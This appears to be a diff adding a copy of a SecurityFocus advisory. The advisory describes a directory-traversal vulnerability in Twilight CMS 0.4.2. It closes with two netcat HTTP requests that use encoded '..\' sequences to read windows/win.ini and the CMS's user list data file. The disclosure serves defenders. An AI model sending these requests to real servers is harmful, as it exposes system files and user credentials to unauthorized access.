@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/61906/info
+
+Twilight CMS is prone to a directory-traversal vulnerability because it fails to properly sanitize user-supplied input.
+
+Remote attackers can use specially crafted requests with directory-traversal sequences ('../') to retrieve arbitrary files in the context of the application.
+
+Exploiting this issue may allow an attacker to obtain sensitive information that could aid in further attacks.
+
+Twilight CMS 0.4.2 is vulnerable; other versions may also be affected. 
+
+nc [www.example.com] 80 GET /..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini HTTP/1.1
+
+nc [www.example.com] 80 GET demosite/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/TwilightCMS/Sites/company_site/Data/user list.dat HTTP/1.1
+
